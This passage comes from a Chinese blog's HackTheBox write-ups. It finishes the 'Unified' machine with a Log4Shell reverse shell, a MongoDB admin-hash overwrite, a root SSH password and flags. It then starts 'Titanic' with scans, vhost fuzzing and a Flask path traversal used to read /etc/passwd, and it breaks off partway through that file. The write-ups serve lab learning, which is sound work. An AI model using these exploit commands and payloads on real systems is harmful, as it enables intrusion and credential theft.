class="hljs-number">-44228</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-8"><a href="#Task-5-8" class="headerlink" title="Task 5"></a>Task 5</h3><p><a href="https://github.com/puzzlepeaches/Log4jUnifi">CVE-2021-44228</a></p><p><a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi</a></p><p>记得检查一下 java 环境（因为我就是忘记检查 Java 环境然后一直失败）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update &amp;&amp; apt install openjdk-11-jre maven<br>git <span class="hljs-built_in">clone</span> --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \ &amp;&amp; <span class="hljs-built_in">cd</span> Log4jUnifi &amp;&amp; pip3 install -r requirements.txt<br>mvn package -f utils/rogue-jndi/<br></code></pre></td></tr></table></figure><p>JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 Java 命名系统接口。如果程序定义了 JNDI 中的接口，那么就能通过接口的 API 去访问命令服务和目录服务。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What protocol <span class="hljs-keyword">does</span> JNDI leverage <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> injection?<br>:LDAP<br></code></pre></td></tr></table></figure><h3 id="Task-6-8"><a href="#Task-6-8" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What tool <span class="hljs-built_in">do</span> we use <span class="hljs-built_in">to</span> intercept <span class="hljs-keyword">the</span> traffic, indicating <span class="hljs-keyword">the</span> attack was successful?<br>:tcpdump<br></code></pre></td></tr></table></figure><h3 id="Task-7-8"><a href="#Task-7-8" class="headerlink" title="Task 7"></a>Task 7</h3><p>反弹 shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> exploit.py -u https://<span class="hljs-number">10.129.61.149:8443</span> -i <span class="hljs-number">10.10.16.45</span> -p <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ea65c75788022868.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">What<span class="hljs-built_in"> port </span><span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> inspect intercepted traffic <span class="hljs-keyword">for</span>?<br>:389<br></code></pre></td></tr></table></figure><h3 id="Task-8-5"><a href="#Task-8-5" class="headerlink" title="Task 8"></a>Task 8</h3><p><code>ps -aux</code> 查看进程，找到 <code>MongoDB</code> 的端口 <code>27117</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/29ecd50035aef4bf.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What port <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> MongoDB service <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span>?<br>:<span class="hljs-number">27117</span><br></code></pre></td></tr></table></figure><h3 id="Task-9-5"><a href="#Task-9-5" class="headerlink" title="Task 9"></a>Task 9</h3><p>连接 <code>MongoDB</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mongo</span> --port <span class="hljs-number">27117</span><br><span class="hljs-comment">#查看所有数据库</span><br><span class="hljs-attribute">show</span> dbs<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d53e89ba85b7111.png"></p><p>默认为 <code>ace</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">default</span> <span class="hljs-keyword">database</span> <span class="hljs-type">name</span> <span class="hljs-keyword">for</span> UniFi applications?<br>:ace<br></code></pre></td></tr></table></figure><h3 id="Task-10-3"><a href="#Task-10-3" class="headerlink" title="Task 10"></a>Task 10</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">function</span> we use <span class="hljs-keyword">to</span> enumerate users <span class="hljs-keyword">within</span> the <span class="hljs-keyword">database</span> <span class="hljs-keyword">in</span> MongoDB?<br>:db.<span class="hljs-keyword">admin</span>.find()<br></code></pre></td></tr></table></figure><h3 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">function</span> we use <span class="hljs-keyword">to</span> <span class="hljs-keyword">update</span> users <span class="hljs-keyword">within</span> the <span class="hljs-keyword">database</span> <span class="hljs-keyword">in</span> MongoDB?<br>:db.<span class="hljs-keyword">admin</span>.<span class="hljs-keyword">update</span>()<br></code></pre></td></tr></table></figure><h3 id="Task-12"><a href="#Task-12" class="headerlink" title="Task 12"></a>Task 12</h3><p>指定端口号然后连接数据库，枚举用户信息以 json 格式打印</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mongo <span class="hljs-comment">--port 27117 ace</span><br>db.<span class="hljs-keyword">admin</span>.find().<span class="hljs-keyword">forEach</span>(printjson);<br></code></pre></td></tr></table></figure><p>部分内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;_id&quot;</span> <span class="hljs-punctuation">:</span> ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>)<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;name&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;administrator&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;email&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;administrator@unified.htb&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;x_shadow&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;time_created&quot;</span> <span class="hljs-punctuation">:</span> NumberLong(<span class="hljs-number">1640900495</span>)<span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;last_site_name&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>用 hashid 查加密方式</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">┌──</span>(root㉿butt3rf1y)<span class="hljs-operator">-</span>[<span class="hljs-regexp">/HTB/</span><span class="hljs-type">Machine</span><span class="hljs-regexp">/Unified/</span> ]<br><span class="hljs-operator">└─</span># hashid &#x27;<span class="hljs-variable">$6</span><span class="hljs-variable">$Ry6Vdbse</span><span class="hljs-variable">$8</span>enMR5Znxoo.<span class="hljs-type">WfCMd</span><span class="hljs-regexp">/Xk65GwuQEPx1M.QP8/</span>qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#x27;<br><span class="hljs-type">Analyzing</span> &#x27;<span class="hljs-variable">$6</span><span class="hljs-variable">$Ry6Vdbse</span><span class="hljs-variable">$8</span>enMR5Znxoo.<span class="hljs-type">WfCMd</span><span class="hljs-regexp">/Xk65GwuQEPx1M.QP8/</span>qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#x27;<br>[<span class="hljs-operator">+</span>] <span class="hljs-type">SHA</span><span class="hljs-operator">-</span><span class="hljs-number">512</span> <span class="hljs-type">Crypt</span><br></code></pre></td></tr></table></figure><p>不好爆破</p><p>用 mkpasswd 创建一个密码，然后把 <code>x_shadow</code> 用 <code>db.admin.update()</code> 命令更新到数据库去</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">└─<span class="hljs-meta"># mkpasswd -m sha-512 admin</span><br>$6$FNM7rHlUpwRIziUu$StfsQybKkHHf9zZkIVQKhvmBD6ApJPzViW/C8EYVxFZlUrM8UHKwDYYLypajSW16dzK8gV9oX7IP5fSmeQSp71<br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">db.<span class="hljs-literal">admin</span>.update(&#123;<span class="hljs-string">&quot;_id&quot;</span>:ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>)&#125;,&#123;<span class="hljs-variable">$set</span>:&#123;<span class="hljs-string">&quot;x_shadow&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$6</span><span class="hljs-variable">$FNM7rHlUpwRIziUu</span><span class="hljs-variable">$StfsQybKkHHf9zZkIVQKhvmBD6ApJPzViW</span>/C8EYVxFZlUrM8UHKwDYYLypajSW16dzK8gV9oX7IP5fSmeQSp71&quot;</span>&#125;&#125;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>使用 <code>administrator:admin</code> 登录进去，在 <code>SETTING/Site/Device Authentication</code> 找到 ssh 的密码 <code>root:NotACrackablePassword4U2022</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/84aed9d92c91868e.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the root <span class="hljs-keyword">user</span>?<br>:NotACrackablePassword4U2022<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-11"><a href="#Submit-Flag-11" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><code>/home/michael</code> 的 user.txt</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:<span class="hljs-number">6</span>ced1a6a89e666c0620cdb10262ba127<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-12"><a href="#Submit-Flag-12" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>ssh 连进去就是 root 了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Submit root flag<br>:e<span class="hljs-number">50</span>bc<span class="hljs-number">93</span><span class="hljs-keyword">c</span><span class="hljs-number">75</span>b<span class="hljs-number">634e4</span>b<span class="hljs-number">272</span>d<span class="hljs-number">2</span>f<span class="hljs-number">771</span><span class="hljs-keyword">c</span><span class="hljs-number">33681</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Titanic</title>
    <link href="/2025/03/04/Titanic/"/>
    <url>/2025/03/04/Titanic/</url>
    
    <content type="html"><![CDATA[<p>寒假赛季打的机器了，唉，拖了这么久才想起发出来（太懒了wwwww），感谢 z3n1th、SWDD、n0o0b 师傅们的帮助www</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap 扫一下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">55</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">20</span>:<span class="hljs-number">15</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">55</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">37</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span><br>Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">12</span>.<span class="hljs-number">58</span> seconds<br><br></code></pre></td></tr></table></figure><p>开放了 80 和 22</p><h1 id="UserFlag"><a href="#UserFlag" class="headerlink" title="UserFlag"></a>UserFlag</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://titanic.htb/ -H  &quot;Host:FUZZ.titanic.htb&quot; -fc <span class="hljs-number">301</span><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/]<br>└─# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://titanic.htb/ -H  &quot;Host:FUZZ.titanic.htb&quot; -fc <span class="hljs-number">301</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://titanic.htb/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt<br> :: Header           : Host: FUZZ.titanic.htb<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response status: <span class="hljs-number">301</span><br>________________________________________________<br><br>dev                     [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">13982</span>, Words: <span class="hljs-number">1107</span>, Lines: <span class="hljs-number">276</span>, Duration: <span class="hljs-number">710</span>ms]<br>:: Progress: [<span class="hljs-number">114441</span>/<span class="hljs-number">114441</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">80</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">20</span>:<span class="hljs-number">50</span>] :: Errors: <span class="hljs-number">0</span> ::<br><br></code></pre></td></tr></table></figure><p>把 <code>dev.titanic.htb</code> 加到 <code>/etc/hosts</code> 里面然后访问</p><p><img src="https://img.dkdun.cn/v1/2025/12/af3ec6ee5d882d00.png"></p><p>发现了 gitea，然后点击 <code>Explore</code>  找到了一些用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/20552900753fbe8f.png"></p><p>只有 <code>developer</code> 用户里有文件，一个 <code>docker-config</code> 和一个 <code>flask-app</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/533b8088f4935b23.png"></p><p>内容如下</p><p><img src="https://img.dkdun.cn/v1/2025/12/2dd9e9d8777690ed.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/a61f7ac027a75a78.png"></p><p>app.py 文件有路径遍历漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template, redirect, url_for, Response<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4<br><br>app = Flask(__name__)<br><br>TICKETS_DIR = <span class="hljs-string">&quot;tickets&quot;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(TICKETS_DIR):<br>    os.makedirs(TICKETS_DIR)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/book&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">book_ticket</span>():<br>    data = &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: request.form[<span class="hljs-string">&#x27;name&#x27;</span>],<br>        <span class="hljs-string">&quot;email&quot;</span>: request.form[<span class="hljs-string">&#x27;email&#x27;</span>],<br>        <span class="hljs-string">&quot;phone&quot;</span>: request.form[<span class="hljs-string">&#x27;phone&#x27;</span>],<br>        <span class="hljs-string">&quot;date&quot;</span>: request.form[<span class="hljs-string">&#x27;date&#x27;</span>],<br>        <span class="hljs-string">&quot;cabin&quot;</span>: request.form[<span class="hljs-string">&#x27;cabin&#x27;</span>]<br>    &#125;<br><br>    ticket_id = <span class="hljs-built_in">str</span>(uuid4())<br>    json_filename = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ticket_id&#125;</span>.json&quot;</span><br>    json_filepath = os.path.join(TICKETS_DIR, json_filename)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_filepath, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> json_file:<br>        json.dump(data, json_file)<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;download_ticket&#x27;</span>, ticket=json_filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_ticket</span>():<br>    ticket = request.args.get(<span class="hljs-string">&#x27;ticket&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ticket:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Ticket parameter is required&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    json_filepath = os.path.join(TICKETS_DIR, ticket)<br><br>    <span class="hljs-keyword">if</span> os.path.exists(json_filepath):<br>        <span class="hljs-keyword">return</span> send_file(json_filepath, as_attachment=<span class="hljs-literal">True</span>, download_name=ticket)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Ticket not found&quot;</span>&#125;), <span class="hljs-number">404</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p><code>download_ticket</code> 路由直接使用用户传入的 <code>ticket</code> 参数拼接文件路径，可以构造像  <code>../../etc/passwd</code> 这样的路径来读取文件</p><p>访问试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://titanic.htb/download?ticket=../../../etc/passwd<br></code></pre></td></tr></table></figure><p>读取下载的文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y/Downloads]<br>└─# cat  _.._.._etc_passwd<br><span class="hljs-function">root:<span class="hljs-title">x</span>:0:0:<span class="hljs-title">root</span>:/<span class="hljs-title">root</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">daemon:x</span>:1:1:<span class="hljs-title">daemon</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">bin:x</span>:2:2:<span class="hljs-title">bin</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">sys:x</span>:3:3:<span class="hljs-title">sys</span>:/<span class="hljs-title">dev</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">sync:x</span>:4:65534:<span class="hljs-title">sync</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">sync</span></span><br><span class="hljs-function"><span class="hljs-title">games:x</span>:5:60:<span class="hljs-title">games</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">games</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">man:x</span>:6:12:<span class="hljs-title">man</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">cache</span>/<span class="hljs-title">man</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">lp:x</span>:7:7:<span class="hljs-title">lp</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">lpd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">mail:x</span>:8:8:<span class="hljs-title">mail</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">mail</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">news:x</span>:9:9:<span class="hljs-title">news</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">news</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">uucp:x</span>:10:10:<span class="hljs-title">uucp</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">uucp</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">proxy:x</span>:13:13:<span class="hljs-title">proxy</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">www</span>-<span class="hljs-title">data:x</span>:33:33:<span class="hljs-title">www</span>-<span class="hljs-title">data</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">backup:x</span>:34:34:<span class="hljs-title">backup</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">backups</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">list:x</span>:38:38:<span class="hljs-title">Mailing</span> <span class="hljs-title">List</span> <span class="hljs-title">Manager</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">list</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">irc:x</span>:39:39:<span class="hljs-title">ircd</span>:/<span class="hljs-title">run</span>/<span class="hljs-title">ircd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">gnats:x</span>:41:41:<span class="hljs-title">Gnats</span> <span class="hljs-title">Bug</span>-<span class="hljs-title">Reporting</span> <span class="hljs-title">System</span> 